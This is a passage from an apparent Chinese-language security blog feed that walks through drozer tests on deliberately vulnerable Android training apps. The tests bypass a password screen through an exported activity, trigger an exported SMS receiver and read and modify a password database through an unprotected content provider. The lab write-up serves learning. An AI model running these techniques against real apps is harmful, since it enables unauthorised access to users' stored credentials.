&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqlite_sequence
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://jakhar.aseem.diva.provider.notesprovider/notes:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqlite_sequence
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description></item><item><title>Test Sieve - activities exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/</guid><description>&lt;ul>
&lt;li>Drozer Seive - &lt;a href="https://labs.withsecure.com/tools/drozer#3.1">官網&lt;/a>, &lt;a href="https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/sieve.apk">Download&lt;/a>
&lt;blockquote>
&lt;p>Sieve is a small password manager app created to showcase some of the common vulnerabilities found in Android applications.&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h1 id="test-sieve---activities-exported">
 Test Sieve - activities exported
 &lt;a class="anchor" href="#test-sieve---activities-exported">#&lt;/a>
&lt;/h1>
&lt;p>參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>，在測試之前要先點進去Sieve App中設定password和email之類的基本資訊，這樣之後測試才知道哪邊其實是漏洞&lt;/p>
&lt;ol>
&lt;li>起手式-確認基本資訊
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run app.package.list -f Sieve # 確認該App的package name
Attempting to run shell module
com.mwr.example.sieve (Sieve)

dz&amp;gt; run app.package.info -a com.mwr.example.sieve # 確認該App的基本資訊
Attempting to run shell module
Package: com.mwr.example.sieve
 Application Label: Sieve
 Process Name: com.mwr.example.sieve
 Version: 1.0
 Data Directory: /data/user/0/com.mwr.example.sieve
 APK Path: /data/app/~~_mRnxjv10ez6OXDQWBrRZw==/com.mwr.example.sieve-yL301IHv87w7debjGy21vA==/base.apk
 UID: 10285
 GID: [3003]
 Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar]
 Shared User ID: null
 Uses Permissions:
 - android.permission.READ_EXTERNAL_STORAGE
 - android.permission.WRITE_EXTERNAL_STORAGE
 - android.permission.INTERNET
 - android.permission.POST_NOTIFICATIONS
 - android.permission.ACCESS_MEDIA_LOCATION
 - android.permission.READ_MEDIA_AUDIO
 - android.permission.READ_MEDIA_VIDEO
 - android.permission.READ_MEDIA_IMAGES
 Defines Permissions:
 - com.mwr.example.sieve.READ_KEYS
 - com.mwr.example.sieve.WRITE_KEYS

dz&amp;gt; run app.package.manifest com.mwr.example.sieve # 確認該App的manifest有沒有什麼異常或漏洞的提示
...

dz&amp;gt; run app.package.attacksurface com.mwr.example.sieve # 確認該App的攻擊面有哪些
Attempting to run shell module
Attack Surface:
 3 activities exported
 0 broadcast receivers exported
 2 content providers exported
 2 services exported
 is debuggable
&lt;/code>&lt;/pre>看攻擊面的左邊就是該攻擊點有幾個&lt;/li>
&lt;li>activities exported
&lt;ol>
&lt;li>列出exported activities有哪些
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.activity.info -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.FileSelectActivity
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.MainLoginActivity
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.PWList
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>啟動activity
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時會看到手機啟動Sieve App，並且原本應該是需要password才能access的activity，居然可以直接bypass
![Screenshot_20240603-163856](&lt;a href="https://hackmd.io/_uploads/rkrr-ZsNA.png">https://hackmd.io/_uploads/rkrr-ZsNA.png&lt;/a> =200x)&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h1 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h1>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://blog.csdn.net/samlirongsheng/article/details/104926282">drozer之玩轉sieve&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item><item><title>Test Sieve - broadcast receivers exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/</guid><description>&lt;h1 id="test-sieve---broadcast-receivers-exported">
 Test Sieve - broadcast receivers exported
 &lt;a class="anchor" href="#test-sieve---broadcast-receivers-exported">#&lt;/a>
&lt;/h1>
&lt;p>這個就不是用Sieve做示範，因為這個App沒有match的receiver&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.broadcast.info -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> No matching receivers.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以我就用之前安裝的goatdroid做示範&lt;/p>
&lt;ol>
&lt;li>檢查broadcast receiver
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.broadcast.info -a org.owasp.goatdroid.fourgoats
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: org.owasp.goatdroid.fourgoats
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>確認後就逆向看一下
在&lt;code>org.owasp.goatdroid.fourgoats.broadcastreceivers&lt;/code>中有SendSMSNowReceiver這個class，內容如下:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SendSMSNowReceiver&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> BroadcastReceiver {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Context context;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.BroadcastReceiver&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">onReceive&lt;/span>(Context arg0, Intent arg1) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> arg0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SmsManager sms &lt;span style="color:#f92672">=&lt;/span> SmsManager.&lt;span style="color:#a6e22e">getDefault&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Bundle bundle &lt;span style="color:#f92672">=&lt;/span> arg1.&lt;span style="color:#a6e22e">getExtras&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sms.&lt;span style="color:#a6e22e">sendTextMessage&lt;/span>(bundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;phoneNumber&amp;#34;&lt;/span>), &lt;span style="color:#66d9ef">null&lt;/span>, bundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;message&amp;#34;&lt;/span>), &lt;span style="color:#66d9ef">null&lt;/span>, &lt;span style="color:#66d9ef">null&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Utils.&lt;span style="color:#a6e22e">makeToast&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">context&lt;/span>, Constants.&lt;span style="color:#a6e22e">TEXT_MESSAGE_SENT&lt;/span>, 1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Send Something
此時我們就可以用drozer發出一個intent，但是在發出之前要看一下AndroidManifest.xml中對於receiver的描述如下，如果想知道這個intent-filter代表的事情可以參考[^chatgpt-intent-filter]，簡單來說就是所有app都可以發出broadcast，那什麼樣的intent會被goatdroid所接收呢?就是帶有&lt;code>org.owasp.goatdroid.fourgoats.SOCIAL_SMS&lt;/code>這個action才會被接收，並且觸發onReceive這個function
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;manifest&lt;/span> &lt;span style="color:#a6e22e">versionCode=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">versionName=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1.0&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">package=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;org.owasp.goatdroid.fourgoats&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;application&lt;/span> &lt;span style="color:#a6e22e">theme=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;@2131361870&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">label=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;@2131296266&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">icon=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;@2130837632&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">debuggable=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;true&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;receiver&lt;/span> &lt;span style="color:#a6e22e">label=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Send SMS&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">name=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.broadcastreceivers.SendSMSNowReceiver&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;intent-filter&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;action&lt;/span> &lt;span style="color:#a6e22e">name=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;org.owasp.goatdroid.fourgoats.SOCIAL_SMS&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;lt;/action&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/intent-filter&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/receiver&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/application&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/manifest&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message &amp;#34;Hello mate!&amp;#34;
&lt;/code>&lt;/pre>因為fourgoat這個App需要一個server，但是原作把server的link下架了，所以我也不知道實際送出這個broadcast會有什麼效果，但就是先紀錄起來，之後有機會可以用&lt;/li>
&lt;/ol></description></item><item><title>Test Sieve - content providers exported - DB Based</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/</guid><description>&lt;h1 id="test-sieve---content-providers-exported---db-based">
 Test Sieve - content providers exported - DB Based
 &lt;a class="anchor" href="#test-sieve---content-providers-exported---db-based">#&lt;/a>
&lt;/h1>
&lt;p>如果想知道實際的狀況和content URI是什麼，可以參考&lt;a href="https://chatgpt.com/share/3a06c1d4-8117-4b27-ad02-1189b931066d">ChatGPT的說明&lt;/a>&lt;/p>
&lt;ol>
&lt;li>起手式
從以下command的結果可以知道&lt;code>com.mwr.example.sieve.DBContentProvider&lt;/code>和&lt;code>com.mwr.example.sieve.FileBackupProvider&lt;/code>的狀況，並且從結果可以知道URI的形式長怎樣
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::spoiler
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.info -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Authority: com.mwr.example.sieve.DBContentProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Content Provider: com.mwr.example.sieve.DBContentProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Multiprocess Allowed: True
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Grant Uri Permissions: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uri Permission Patterns:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path: /Keys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Type: PATTERN_LITERAL
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: com.mwr.example.sieve.READ_KEYS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: com.mwr.example.sieve.WRITE_KEYS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Authority: com.mwr.example.sieve.FileBackupProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Content Provider: com.mwr.example.sieve.FileBackupProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Multiprocess Allowed: True
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Grant Uri Permissions: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uri Permission Patterns:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.finduris -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/Keys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.DBContentProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>For sure accessible content URIs:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>逆向
實際去看&lt;code>DBContentProvider&lt;/code>這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.ContentProvider&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">onCreate&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">pwdb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> PWDBHelper(getContext());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">sUriMatcher&lt;/span>.&lt;span style="color:#a6e22e">addURI&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.DBContentProvider&amp;#34;&lt;/span>, PWTable.&lt;span style="color:#a6e22e">TABLE_NAME&lt;/span>, 100);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">sUriMatcher&lt;/span>.&lt;span style="color:#a6e22e">addURI&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.DBContentProvider&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Keys&amp;#34;&lt;/span>, KEY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table)&lt;/li>
&lt;li>query/insert/update/delete/sqli
&lt;ul>
&lt;li>query
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Simple Query&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>insert
根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id &lt;span style="color:#ae81ff">2&lt;/span> --string password bbb --string email aaa@bbb.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password bbb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email aaa@bbb.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>update
_id=2的data，被我們改掉了
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selection-args &lt;span style="color:#ae81ff">2&lt;/span> --string password ccc --string email ddd@eee.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password ccc
